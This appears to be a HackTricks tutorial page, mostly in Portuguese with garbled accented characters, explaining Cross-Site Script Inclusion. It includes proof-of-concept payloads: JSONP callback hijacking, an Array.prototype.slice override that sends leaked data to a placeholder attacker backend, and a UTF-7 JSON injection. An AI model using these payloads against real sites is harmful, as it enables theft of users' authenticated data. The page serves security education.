# XSSI (Cross-Site Script Inclusion)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## Basic Information

**Cross-Site Script Inclusion (XSSI)** √© uma vulnerabilidade que surge da natureza da tag `script` em HTML. Ao contr√°rio da maioria dos recursos, que est√£o sujeitos √† **Same-Origin Policy (SOP)**, scripts podem ser inclu√≠dos de diferentes dom√≠nios. Esse comportamento √© destinado a facilitar o uso de bibliotecas e outros recursos hospedados em servidores diferentes, mas tamb√©m introduz um risco potencial de seguran√ßa.

### Key Characteristics of **XSSI**:
- **Bypass of SOP**: Scripts est√£o isentos da **Same-Origin Policy**, permitindo que sejam inclu√≠dos entre dom√≠nios.
- **Data Exposure**: Um atacante pode explorar esse comportamento para ler dados carregados via a tag `script`.
- **Impact on Dynamic JavaScript/JSONP**: **XSSI** √© particularmente relevante para JavaScript din√¢mico ou **JSON with Padding (JSONP)**. Essas tecnologias frequentemente usam informa√ß√µes de "ambient-authority" (como cookies) para autentica√ß√£o. Quando uma solicita√ß√£o de script √© feita para um host diferente, essas credenciais (por exemplo, cookies) s√£o automaticamente inclu√≠das na solicita√ß√£o.
- **Authentication Token Leakage**: Se um atacante conseguir enganar o navegador de um usu√°rio para solicitar um script de um servidor que ele controla, pode ser capaz de acessar informa√ß√µes sens√≠veis contidas nessas solicita√ß√µes.

### Types

1. **Static JavaScript** - Esta representa a forma convencional de XSSI.
2. **Static JavaScript with Authentication** - Este tipo √© distinto porque requer autentica√ß√£o para acesso.
3. **Dynamic JavaScript** - Envolve JavaScript que gera conte√∫do dinamicamente.
4. **Non-JavaScript** - Refere-se a vulnerabilidades que n√£o envolvem JavaScript diretamente.

**The following information is a sumary of [https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)**. Check it for further details.


### Regular XSSI
Nesta abordagem, informa√ß√µes privadas s√£o incorporadas dentro de um arquivo JavaScript acess√≠vel globalmente. Os atacantes podem identificar esses arquivos usando m√©todos como leitura de arquivos, buscas por palavras-chave ou express√µes regulares. Uma vez localizados, o script contendo informa√ß√µes privadas pode ser inclu√≠do em conte√∫do malicioso, permitindo acesso n√£o autorizado a dados sens√≠veis. Uma t√©cnica de explora√ß√£o de exemplo √© mostrada abaixo:
```html
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script> alert(JSON.stringify(confidential_keys[0])); </script>
```
### Dynamic-JavaScript-based-XSSI e Authenticated-JavaScript-XSSI
Esses tipos de ataques XSSI envolvem informa√ß√µes confidenciais sendo adicionadas dinamicamente ao script em resposta a uma solicita√ß√£o do usu√°rio. A detec√ß√£o pode ser realizada enviando solicita√ß√µes com e sem cookies e comparando as respostas. Se as informa√ß√µes diferirem, isso pode indicar a presen√ßa de informa√ß√µes confidenciais. Esse processo pode ser automatizado usando ferramentas como a extens√£o Burp [DetectDynamicJS](https://github.com/luh2/DetectDynamicJS).

Se dados confidenciais forem armazenados em uma vari√°vel global, eles podem ser explorados usando m√©todos semelhantes aos utilizados no XSSI Regular. No entanto, se os dados confidenciais estiverem inclu√≠dos em uma resposta JSONP, os atacantes podem sequestrar a fun√ß√£o de callback para recuperar as informa√ß√µes. Isso pode ser feito manipulando objetos globais ou configurando uma fun√ß√£o para ser executada pela resposta JSONP, conforme demonstrado abaixo:
```html
<script>
var angular = function () { return 1; };
angular.callbacks = function () { return 1; };
angular.callbacks._7 = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=angular.callbacks._7" type="text/javascript"></script>
```

```html
<script>
leak = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```
Para vari√°veis que n√£o residem no namespace global, *prototype tampering* pode √†s vezes ser explorado. Esta t√©cnica aproveita o design do JavaScript, onde a interpreta√ß√£o do c√≥digo envolve percorrer a cadeia de prot√≥tipos para localizar a propriedade chamada. Ao sobrescrever certas fun√ß√µes, como o `slice` de `Array`, os atacantes podem acessar e vazar vari√°veis n√£o globais:
```javascript
Array.prototype.slice = function(){
// leaks ["secret1", "secret2", "secret3"]
sendToAttackerBackend(this);
};
```
Mais detalhes sobre vetores de ataque podem ser encontrados no trabalho do Pesquisador de Seguran√ßa [Sebastian Lekies](https://twitter.com/slekies), que mant√©m uma lista de [vetores](http://sebastian-lekies.de/leak/).

### Non-Script-XSSI
A pesquisa de Takeshi Terada introduz outra forma de XSSI, onde arquivos Non-Script, como CSV, s√£o vazados cross-origin ao serem inclu√≠dos como fontes em uma tag `script`. Inst√¢ncias hist√≥ricas de XSSI, como o ataque de Jeremiah Grossman em 2006 para ler uma lista de contatos completa do Google e o vazamento de dados JSON de Joe Walker em 2007, destacam a gravidade dessas amea√ßas. Al√©m disso, Gareth Heyes descreve uma variante de ataque envolvendo JSON codificado em UTF-7 para escapar do formato JSON e executar scripts, eficaz em certos navegadores:
```javascript
[{'friend':'luke','email':'+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-'}]
```

```html
<script src="http://site.tld/json-utf7.json" type="text/javascript" charset="UTF-7"></script>
```
{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporte o HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}
